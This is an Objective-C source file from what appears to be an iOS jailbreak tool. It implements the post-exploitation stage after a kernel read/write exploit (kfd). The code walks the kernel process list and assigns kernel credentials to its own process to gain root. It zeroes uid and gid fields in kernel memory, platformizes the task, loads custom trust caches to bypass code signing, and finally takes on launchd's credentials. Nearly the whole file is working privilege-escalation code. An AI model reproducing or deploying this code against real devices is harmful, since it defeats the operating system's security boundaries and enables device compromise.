//
//  post_exp.m
//  escape
//
//  Created by Xiao on 2023/11/9.
//

#import <Foundation/Foundation.h>
#import "post_exp.h"
#import "objcLogger.h"
#import "offsets.h"
#import "libkfd.h"
#import "krw.h"
#import "kcall.h"
#import "kpf.h"
#import "trustcache.h"
#import <spawn.h>
#import <stdlib.h>
#import <unistd.h>
#import <sys/stat.h>
#import "utils.h"
#import "kerncs.h"

uint64_t __kfd = 0;

static void platformize(uint64_t proc, uint64_t task) {
    uint32_t t_flags = kread32(task + off_task_t_flags);
    // LOG_FMT(@"[*] task_t->flags: 0x%x", t_flags);
    t_flags |= 0x00000400;
    kwrite32(task + off_task_t_flags, t_flags);
    LOG_FMT(@"[*] task_t->flags: 0x%x", kread32(task + off_task_t_flags));
}

uint64_t proc_for_pid(uint32_t pid) {
    uint64_t proc = ((struct kfd *)__kfd)->info.kernel.kernel_proc;
    
    while (1) {
        if(kread32(proc + off_p_pid) == pid) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    return -1;
}

uint64_t proc_for_name(const char *proc_name) {
    uint64_t proc = ((struct kfd *)__kfd)->info.kernel.kernel_proc;
    char str[0x100] = { 0 };
    while(1) {
        kread_string(proc + off_p_name, str);
        if(!strcmp(str, proc_name)) {
            return proc;
        }
        proc = kread64(proc + off_p_list_le_prev);
        if(!proc) {
            return -1;
        }
    }
    return -1;
}

pid_t pid_for_name(char* name) {
    uint64_t proc = proc_for_name(name);
    if (proc == -1)
        return -1;
    return kread32(proc + off_p_pid);
}

uint64_t cred_for_proc(uint64_t proc) {
    uint64_t proc_ro = kread64(proc + 0x20);
    uint64_t proc_cred_ro = kread64(proc_ro + 0x20);
    return proc_cred_ro;
}

uint64_t taskptr_for_pid(pid_t pid) {
    uint64_t proc_ro = kread64(proc_for_pid(pid) + 0x20);
    return kread64(proc_ro + 0x8);
}

static void set_cred_for_proc(uint64_t proc, uint64_t cred) {
    kcall2(off_proc_set_ucred, proc, cred, 0, 0, 0, 0);
}

static void set_cred_for_pid(pid_t pid, uint64_t cred) {
    set_cred_for_proc(proc_for_pid(pid), cred);
}

void set_pidcred_for_pid(pid_t pid, pid_t target_pid) {
    uint64_t cred = cred_for_proc(proc_for_pid(target_pid));
    set_cred_for_pid(pid, cred);
}

void get_root(uint32_t pid) {
    LOG_FMT(@"[*] root pid=%d", pid);
    uint64_t proc = proc_for_pid(pid);
    uint64_t kernel_cred = cred_for_proc(((struct kfd *)__kfd)->info.kernel.kernel_proc);
    kcall2(off_proc_set_ucred, proc, kernel_cred, 0, 0, 0, 0);
}

void post_exp(uint64_t f) {
    LOG(@"[*] start post exploitation");
    
    struct kfd *kfd = (struct kfd *)f;
    __kfd = f;
    
    _offsets_init();
    // kernel_slide = kfd->info.kernel.kernel_slide;

    int cur_uid = getuid();

    LOG_FMT(@"[*] current uid: %d", cur_uid);
    
    pretty_print_csflag(proc_get_csflag(kfd->info.kernel.current_proc));
    pretty_print_csflag(proc_get_csflag(kfd->info.kernel.kernel_proc));
    pretty_print_csflag(proc_get_csflag(proc_for_pid(1)));
    
    uint32_t d32 = 0;
    d32 = kread32(off_p_uid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_uid)=%d", d32);
    d32 = kread32(off_p_gid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_gid)=%d", d32);
    d32 = kread32(off_p_ruid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_ruid)=%d", d32);
    d32 = kread32(off_p_rgid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] kread(off_p_rgid)=%d", d32);
    
    BOOL r = kcall_init(kfd);
    if (!r) {
        LOG(@"[-] kcall_init failed");
        return;
    }
    
    get_root(getpid());

    kwrite32(off_p_uid + kfd->info.kernel.current_proc, 0);
    kwrite32(off_p_gid + kfd->info.kernel.current_proc, 0);
    kwrite32(off_p_ruid + kfd->info.kernel.current_proc, 0);
    kwrite32(off_p_rgid + kfd->info.kernel.current_proc, 0);

    d32 = kread32(off_p_uid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_uid=%d", d32);
    d32 = kread32(off_p_gid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_gid=%d", d32);
    d32 = kread32(off_p_ruid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_ruid=%d", d32);
    d32 = kread32(off_p_rgid + kfd->info.kernel.current_proc);
    LOG_FMT(@"[*] p_rgid=%d", d32);
    
    LOG_FMT(@"[*] getuid()=%d", getuid());
    platformize(kfd->info.kernel.current_proc, kfd->info.kernel.current_task);
    
    uint64_t tcsize = 0;
    NSString *tar_trustcache_path = [NSString stringWithFormat:@"%@%@",
                                     NSBundle.mainBundle.bundlePath, @"/tar.tc"];
    NSString *binpack_trustcache_path = [NSString stringWithFormat:@"%@%@",
                                         NSBundle.mainBundle.bundlePath, @"/iosbinpack.tc"];
    NSString *binaries_trustcache_path = [NSString stringWithFormat:@"%@%@",
                                          NSBundle.mainBundle.bundlePath, @"/binaries.tc"];
    NSString *jb_trustcache_path = [NSString stringWithFormat:@"%@%@",
                                          NSBundle.mainBundle.bundlePath, @"/jb.tc"];

    load_trustcache(tar_trustcache_path, &tcsize);
    load_trustcache(binpack_trustcache_path, &tcsize);
    // load_trustcache(binaries_trustcache_path, &tcsize);
    load_trustcache(jb_trustcache_path, &tcsize);
    
    LOG(@"[*] start jailbreak environment");
    start_jbenv();
    LOG(@"[+] jailbreak environment started");
    
    // final step
    set_pidcred_for_pid(getpid(), 1);
    
    LOG(@"[+] set ucred to launchd");
    LOG(@"[+] done");
    
    return;
}

int cs_bypass() {
    return 0;
}
